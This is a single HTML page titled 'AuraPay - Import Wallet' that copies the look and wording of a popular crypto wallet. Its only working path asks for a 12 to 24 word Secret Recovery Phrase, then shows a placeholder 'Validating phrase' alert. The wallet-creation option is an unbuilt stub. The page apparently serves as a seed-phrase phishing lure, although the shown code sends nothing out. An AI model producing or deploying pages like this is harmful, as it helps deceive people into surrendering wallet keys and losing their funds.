<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AuraPay - Import Wallet</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body { background-color: #24292e; color: white; font-family: 'Inter', sans-serif; margin: 0; }
        .aurapay-blue { background-color: #037dd6; }
        .aurapay-blue:hover { background-color: #0260a4; }
        .outline-button { border: 2px solid #037dd6; color: #037dd6; }
        .hidden { display: none; }
        textarea:focus { border-color: #037dd6; outline: none; box-shadow: 0 0 10px rgba(3, 125, 214, 0.2); }
        .seed-word { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 8px; border-radius: 8px; font-size: 14px; text-align: center; }
    </style>
</head>
<body class="p-6 flex flex-col items-center min-h-screen">

    <div class="w-full max-w-md flex items-center justify-between mt-4 mb-10">
        <button onclick="showPage('setup-page')" class="text-[#037dd6] font-semibold text-lg flex items-center">
            <span class="text-3xl mr-1 mb-1">‹</span> Back
        </button>
        <h2 class="text-xl font-bold tracking-[0.3em] text-gray-200">AURAPAY</h2>
        <div class="w-10"></div>
    </div>

    <div id="setup-page" class="w-full max-w-md flex flex-col items-center">
        <div class="text-center mt-10">
            <h1 class="text-4xl font-bold mb-4">Wallet setup</h1>
            <p class="text-gray-400 text-lg mb-12 px-6">Import an existing wallet or create a new one</p>
            <div class="space-y-5 w-full px-4">
                <button onclick="showPage('import-page')" class="w-full outline-button py-4 rounded-full font-bold text-[16px]">Import using Secret Recovery Phrase</button>
                <button onclick="showPage('password-page')" class="w-full aurapay-blue py-4 rounded-full font-bold text-[16px] shadow-lg">Create a new wallet</button>
            </div>
        </div>
    </div>

    <div id="import-page" class="hidden w-full max-w-md">
        <h1 class="text-3xl font-bold mb-4 text-center">Import with SRP</h1>
        <p class="text-gray-400 mb-8 text-center px-4 leading-tight">
            Enter your 12, 15, 18, 21, or 24-word Secret Recovery Phrase to import your existing wallet.
        </p>

        <div class="space-y-6 px-4">
            <div class="relative">
                <textarea id="seed-input" rows="5" 
                placeholder="Enter your Secret Recovery Phrase here. Separate each word with a single space." 
                class="w-full bg-[#1c2125] border border-gray-600 p-4 rounded-xl text-white text-sm leading-relaxed placeholder:text-gray-600"></textarea>
            </div>
            
            <div class="bg-blue-500/10 p-4 rounded-xl border border-blue-500/20">
                <p class="text-xs text-sky-500 leading-relaxed">
                    <strong>Tip:</strong> Ensure you are in a safe place and no one is watching your screen.
                </p>
            </div>

            <button onclick="handleImport()" class="w-full aurapay-blue py-4 rounded-full font-bold text-lg mt-4 shadow-lg active:scale-95 transition-all">
                Import Wallet
            </button>
        </div>
    </div>

    <div id="password-page" class="hidden w-full max-w-md text-center pt-20">
        <h2 class="text-2xl font-bold">Create Password Coming Soon...</h2>
        <button onclick="showPage('setup-page')" class="mt-10 text-sky-500">Go Back</button>
    </div>

    <script>
        function showPage(pageId) {
            document.getElementById('setup-page').classList.add('hidden');
            document.getElementById('import-page').classList.add('hidden');
            document.getElementById('password-page').classList.add('hidden');
            document.getElementById(pageId).classList.remove('hidden');
        }

        function handleImport() {
            const seed = document.getElementById('seed-input').value.trim();
            const words = seed.split(/\s+/); // स्मार्ट स्पेस चेक

            if (seed === "") {
                alert("Please enter your recovery phrase.");
                return;
            }

            if (words.length < 12) {
                alert("The phrase must be at least 12 words. You currently have " + words.length + ".");
                return;
            }

            // असली मैसेज
            alert("Validating phrase... Please wait.");
        }
    </script>
</body>
</html>
